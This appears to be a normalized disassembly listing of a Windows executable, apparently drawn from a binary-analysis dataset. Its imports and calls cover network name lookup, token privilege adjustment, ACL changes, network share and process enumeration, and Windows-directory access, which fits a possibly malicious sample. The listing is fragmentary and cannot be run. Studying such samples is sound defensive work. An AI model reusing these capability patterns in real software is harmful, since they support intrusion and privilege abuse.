cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_401000
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
sub_401041
mov eax r-xdata
retn
sub_4015e6
sub esp 0x190
lea eax [ esp ]
push eax
push 0x2
call [ WSAStartup@IAT ]
neg eax
sbb eax eax
inc eax
add esp 0x190
retn
sub_402b2b
push [ esp + 0x4 ]
call [ gethostbyname@IAT ]
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax + 0xc ]
mov eax [ eax ]
push [ eax ]
call [ inet_ntoa@IAT ]
retn
sub_4035ea
xor eax eax
push eax
push eax
push eax
push [ esp + 0x14 ]
push eax
push [ esp + 0x18 ]
call [ AdjustTokenPrivileges@IAT ]
retn
sub_403b2e
mov eax [ rw-data ]
push [ eax ]
call sub_403af8
neg eax
sbb al al
pop ecx
and al 0xa
add al 0x45
mov [ rw-data ] al
jmp sub_4040e4
sub_403b84
mov eax [ rw-data ]
push [ eax ]
call sub_403b4d
neg eax
sbb al al
pop ecx
and al 0xa
add al 0x45
mov [ rw-data ] al
jmp sub_4040e4
sub_403ba3
push [ rw-data ]
call sub_405509
neg eax
sbb al al
pop ecx
and al 0xa
add al 0x45
mov [ rw-data ] al
jmp sub_4040e4
sub_403d42
push 0x0
push [ rw-data ]
call [ CreateDirectoryA@IAT ]
neg eax
sbb al al
and al 0xa
add al 0x45
mov [ rw-data ] al
jmp sub_4040e4
sub_4047c8
mov eax [ rw-data ]
lea ecx [ eax + 0x4 ]
push ecx
push [ eax ]
call sub_404644
pop ecx
pop ecx
retn
sub_4048e0
push 0x200
push [ rw-data ]
call [ GetWindowsDirectoryA@IAT ]
push rw-data
push [ rw-data ]
call strcat
push 0x4f
call sub_4047db
add esp 0xc
retn
sub_4054f2
push 0x0
push rw-data
call sub_40175c
pop ecx
pop ecx
push 0x1
call [ ExitProcess@IAT ]
SetSecurityInfo
jmp [ SetSecurityInfo@IAT ]
SetEntriesInAclA
jmp [ SetEntriesInAclA@IAT ]
WNetCloseEnum
jmp [ WNetCloseEnum@IAT ]
__CxxFrameHandler
jmp [ __CxxFrameHandler@IAT ]
_EH_prolog
jmp [ _EH_prolog@IAT ]
strcat
jmp [ strcat@IAT ]
strcpy
jmp [ strcpy@IAT ]
strlen
jmp [ strlen@IAT ]
memset
jmp [ memset@IAT ]
memcpy
jmp [ memcpy@IAT ]
strcmp
jmp [ strcmp@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_405f80
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_405f92
xor eax eax
retn
sub_405f95
retn
_except_handler3
jmp [ _except_handler3@IAT ]
_controlfp
jmp [ _controlfp@IAT ]
Process32Next
jmp [ Process32Next@IAT ]
Process32First
jmp [ Process32First@IAT ]
CreateToolhelp32Snapshot
jmp [ CreateToolhelp32Snapshot@IAT ]
sub_405fc4
mov eax r--data
jmp __CxxFrameHandler
